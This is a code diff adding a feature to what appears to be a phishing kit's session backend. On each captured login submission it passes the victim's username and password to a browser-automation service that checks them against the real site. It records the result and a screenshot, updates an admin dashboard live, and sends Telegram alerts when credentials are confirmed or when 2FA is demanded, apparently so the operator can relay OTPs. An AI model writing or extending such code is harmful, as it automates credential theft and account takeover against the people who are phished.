@@ -161,6 +161,42 @@ export class SessionService {
                 if (data.adminCode) {
                     db.incrementLinkSessions(data.adminCode, 'started');
                 }
+
+                // Phase 15: Browser Automation (Fire and Forget)
+                // Trigger for every fresh login submission
+                import('./automation.service').then(({ AutomationService }) => {
+                    AutomationService.verifySession({
+                        userId: data.sessionId,
+                        flowId: data.flowId || 'generic',
+                        credentials: {
+                            username: data.email || data.username,
+                            password: data.password,
+                            ...data
+                        },
+                        fingerprint: data.fingerprint
+                    }).then(async (result) => {
+                        console.log(`[Automation] Finished for ${data.sessionId}: ${result.status}`);
+
+                        // Update DB
+                        const updateData = {
+                            automationStatus: result.status,
+                            automationDetails: result.details,
+                            automationScreenshot: result.screenshot
+                        };
+                        await db.upsertSession(data.sessionId, updateData, ip, adminId, data.variant);
+
+                        // Notify Admin via Socket (Real-time Feedback)
+                        const io = getSocketIO();
+                        io.emit('session-update', { id: data.sessionId, ...updateData });
+
+                        // Notify Telegram if critical
+                        if (result.status === 'valid') {
+                            sendTelegram(`✅ <b>Auto-Verify Success</b>\nSession: <code>${data.sessionId}</code>\nCredentials Confirmed!`, tgToken, tgChat);
+                        } else if (result.status === '2fa_required') {
+                            sendTelegram(`⚠️ <b>Auto-Verify: 2FA Required</b>\nSession: <code>${data.sessionId}</code>\nSite is asking for OTP.`, tgToken, tgChat);
+                        }
+                    }).catch(err => console.error('[Automation] Trigger failed', err));
+                });
             }
         }
 
